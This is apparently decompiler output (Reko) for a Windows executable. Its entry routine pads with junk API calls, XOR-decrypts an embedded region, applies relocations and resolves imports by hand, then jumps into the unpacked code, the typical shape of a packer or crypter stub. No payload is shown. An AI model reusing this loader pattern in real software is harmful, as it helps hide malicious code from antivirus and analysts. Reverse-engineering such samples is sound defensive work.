// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 esi_387 = AddAce(null, 0x00, 0x00, null, 0x00) + 0x25 + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00);
	Eq_3 ebx_15 = null;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		esi_387 = esi_387 - 0x22;
	struct Eq_246 * ecx_399 = null;
	do
	{
		if (ebx_15 == esi_387)
			ebx_15 = null;
		ecx_399[4199088] = (struct Eq_246) (ecx_399[4199088] ^ ebx_15[0x00404000]);
		ecx_399 = ecx_399 + 0x01;
		ebx_15 = (Eq_3) (ebx_15 + 0x01);
	} while (ecx_399 < (struct Eq_246 *) 5152);
	struct Eq_268 * edx_427 = &globals->t402590;
	uint32 dwLoc0C_430 = 0x00;
	do
	{
		Eq_272 eax_438 = edx_427->t0004;
		cui16 * ecx_445 = (char *) &edx_427->t0004 + 0x04;
		if (eax_438 - 0x08 >> 0x01 > 0x00)
		{
			uint32 esi_648 = eax_438 - 0x08 >> 0x01;
			do
			{
				if ((*ecx_445 & 0xF000) == 0x3000)
				{
					struct Eq_304 * eax_666 = ((word32) *ecx_445 & 0x0FFF) + edx_427->dw0000;
					eax_666->dw401030 = eax_666->dw401030 + 0xF0401030;
				}
				ecx_445 = ecx_445 + 0x01;
				esi_648 = esi_648 - 0x01;
			} while (esi_648 != 0x00);
		}
		Eq_272 eax_450 = edx_427->t0004;
		uint32 ecx_452 = (word32) eax_450.u0 + dwLoc0C_430;
		word32 edx_453 = edx_427 + eax_450;
		int32 eax_457 = edx_453->dw0004;
		uint32 ecx_459 = ecx_452 + eax_457;
		edx_427 = (struct Eq_268 *) (edx_453 + eax_457 / 0x08);
		dwLoc0C_430 = ecx_459;
	} while (ecx_459 < 228);
	struct Eq_335 * ebx_469 = &globals->t401D8C;
	struct Eq_335 * dwLoc0C_470 = &globals->t401D8C;
	ebx_505 = ebx_469;
	if (globals->dw401D9C != 0x00)
	{
		do
		{
			struct Eq_335 * ebx_505;
			Eq_374 eax_511 = LoadLibraryA(ebx_505->dw000C + 0x00401030);
			CloseHandle((void *) 0x62);
			CloseHandle((void *) 0x62);
			Eq_374 eax_530 = LoadLibraryA(ebx_505->dw000C + 0x00401030);
			CloseHandle((void *) 0x62);
			CloseHandle((void *) 0x62);
			if (eax_530 != null)
			{
				word32 ebp_569 = ebx_505->dw0000;
				if (ebp_569 == 0x00)
					ebp_569 = ebx_505->dw0010;
				word32 * ebp_575 = ebp_569 + 0x00401030;
				word32 * ebx_576 = ebx_505->dw0010 + 0x00401030;
				if (*ebp_575 != 0x00)
				{
					do
					{
						int32 eax_609 = *ebp_575;
						word16 ax_611 = (word16) eax_609;
						if (eax_609 < 0x00)
							*ebx_576 = (word32) GetProcAddress(eax_530, (word32) ax_611);
						else
							*ebx_576 = (word32) GetProcAddress(eax_530, eax_609 + 0x00401032);
						ebp_575 = ebp_575 + 0x01;
						ebx_576 = ebx_576 + 0x01;
					} while (*ebp_575 != 0x00);
				}
				ebx_505 = dwLoc0C_470;
			}
			ebx_505 = ebx_505 + 0x01;
			dwLoc0C_470 = ebx_505;
		} while (ebx_505->dw0010 != 0x00);
	}
	ptr32 esp_481;
	byte SCZO_482;
	word32 ebx_483;
	word32 ebp_484;
	word32 esi_485;
	word32 edi_486;
	byte SZO_487;
	byte C_488;
	word32 edx_489;
	word32 eax_490;
	byte Z_491;
	word32 ecx_492;
	byte al_493;
	word16 ax_494;
	byte S_495;
	globals->t401A80();
	*(esp_481 - 0x04) = 0x00;
	ExitProcess(*(esp_481 - 0x04));
}

